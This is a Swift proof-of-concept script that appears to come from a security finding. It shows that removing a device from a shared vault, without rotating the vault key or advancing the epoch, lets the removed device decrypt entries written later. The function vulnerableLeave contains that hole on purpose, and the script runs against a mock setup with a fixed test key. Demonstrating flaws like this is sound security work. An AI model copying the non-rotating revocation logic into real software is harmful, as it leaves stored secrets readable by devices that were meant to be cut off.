import CryptoKit
import Foundation

struct Metadata {
    var epoch: Int
    var devices: [String]
    var wrappedKeys: [String: String]
}

func vulnerableLeave(_ metadata: inout Metadata, deviceID: String) {
    metadata.devices.removeAll { $0 == deviceID }
    metadata.wrappedKeys.removeValue(forKey: deviceID)
    // The vulnerable implementation does not advance the epoch or replace
    // the shared vault key.
}

func seal(_ plaintext: String, keyData: Data) throws -> AES.GCM.SealedBox {
    try AES.GCM.seal(Data(plaintext.utf8), using: SymmetricKey(data: keyData))
}

func open(_ box: AES.GCM.SealedBox, keyData: Data) throws -> String {
    let plaintext = try AES.GCM.open(box, using: SymmetricKey(data: keyData))
    return String(decoding: plaintext, as: UTF8.self)
}

let leavingDevice = "device-b"
var metadata = Metadata(
    epoch: 7,
    devices: ["device-a", leavingDevice],
    wrappedKeys: [
        "device-a": "ecies-wrapped-K7-for-a",
        leavingDevice: "ecies-wrapped-K7-for-b",
    ]
)

// An authorized endpoint necessarily obtains the unwrapped symmetric key
// while it is authorized. A compromised endpoint can retain those bytes.
let currentVaultKey = Data((0..<32).map(UInt8.init))
let capturedByLeavingDevice = currentVaultKey

print("[+] before leave: epoch=\(metadata.epoch) devices=\(metadata.devices.sorted())")
vulnerableLeave(&metadata, deviceID: leavingDevice)
print("[+] after leave:  epoch=\(metadata.epoch) devices=\(metadata.devices.sorted())")
print("[+] wrapped key removed for device-b: \(metadata.wrappedKeys[leavingDevice] == nil)")

// A remaining authorized device writes a new entry after the removal. Because
// no rotation occurred, it still uses K7.
let futureEntry = try seal("future-secret-after-removal", keyData: currentVaultKey)
let recovered = try open(futureEntry, keyData: capturedByLeavingDevice)

print("[+] removed device decrypted future entry: \(recovered)")
guard recovered == "future-secret-after-removal" else {
    fatalError("PoC did not reproduce the retained-key condition")
}
